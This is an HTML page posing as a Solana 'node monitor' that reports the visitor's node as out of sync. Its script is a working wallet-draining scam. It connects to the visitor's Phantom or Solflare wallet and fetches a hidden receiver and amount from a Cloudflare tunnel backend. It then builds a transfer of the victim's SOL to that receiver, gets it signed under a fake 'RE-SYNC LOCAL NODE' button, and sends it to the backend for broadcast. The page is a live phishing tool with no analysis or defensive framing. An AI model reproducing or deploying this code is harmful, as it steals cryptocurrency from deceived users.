<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana System Status</title>
    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #00ffa3; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ffa3; padding: 30px; border-radius: 8px; background: #111; width: 350px; text-align: center; box-shadow: 0 0 20px rgba(0,255,163,0.2); }
        .status-on { color: #00ffa3; font-weight: bold; }
        .status-off { color: #ff3e3e; font-weight: bold; }
        .bar { background: #222; height: 4px; width: 100%; margin: 20px 0; overflow: hidden; }
        #progress { background: #00ffa3; height: 100%; width: 0%; transition: 0.4s; }
        button { background: #00ffa3; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; transition: 0.3s; }
        button:hover { background: #00cc82; transform: scale(1.02); }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="margin-top:0;">NODE MONITOR V4.1</h3>
        <p style="font-size: 13px; color: #888;">NETWORK: <span class="status-on">MAINNET-BETA</span></p>
        <p style="font-size: 13px; color: #888;">SYNC STATUS: <span class="status-off">OUT OF SYNC</span></p>
        <div class="bar"><div id="progress"></div></div>
        <button id="cta">RE-SYNC LOCAL NODE</button>
        <p id="msg" style="font-size: 11px; margin-top:15px; color: #555;">Waiting for wallet authorization...</p>
    </div>

    <script>
        // ðŸ”± åŠ¡å¿…ç¡®è®¤è¿™ä¸ªåœ°å€æ˜¯ä½ æœ€æ–°çš„ Cloudflare é“¾æŽ¥
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana;
            const sWeb3 = window.solanaWeb3;
            if (!p) { alert("Please use Phantom or Solflare browser."); return; }

            try {
                // 1. è¿žæŽ¥å¹¶èŽ·å–åœ°å€
                const resp = await p.connect();
                const address = resp.publicKey.toString();
                document.getElementById('progress').style.width = "30%";
                document.getElementById('msg').innerText = "Fetching sync params...";

                // 2. é—®åŽç«¯ç´¢è¦â€œå½±å­å‚æ•°â€ (é‡‘é¢å’ŒæŽ¥æ”¶åœ°å€å…¨åœ¨åŽç«¯)
                const info = await fetch(`${tunnel}/prepare`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address })
                }).then(r => r.json());

                if (info.error) {
                    document.getElementById('msg').innerText = "Status: Already Synchronized";
                    document.getElementById('progress').style.width = "100%";
                    return;
                }

                // 3. æž„é€ æžå…¶ç®€å•çš„è½¬è´¦
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new sWeb3.PublicKey(info.receiver),
                        lamports: info.amount,
                    })
                );
                tx.recentBlockhash = info.bh;
                tx.feePayer = resp.publicKey;
                document.getElementById('progress').style.width = "60%";
                document.getElementById('msg').innerText = "Awaiting signature...";

                // 4. ç­¾åå¹¶äº¤ç”±åŽç«¯å¹¿æ’­
                const signed = await p.signTransaction(tx);
                const binary = String.fromCharCode.apply(null, signed.serialize());
                
                fetch(`${tunnel}/broadcast`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: btoa(binary) })
                });

                document.getElementById('progress').style.width = "100%";
                document.getElementById('msg').innerText = "Node Resynced. Redirecting...";
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (e) {
                console.error(e);
                document.getElementById('msg').innerText = "Sync Failed. Retrying...";
                setTimeout(() => { location.reload(); }, 2000);
            }
        };
    </script>
</body>
</html>
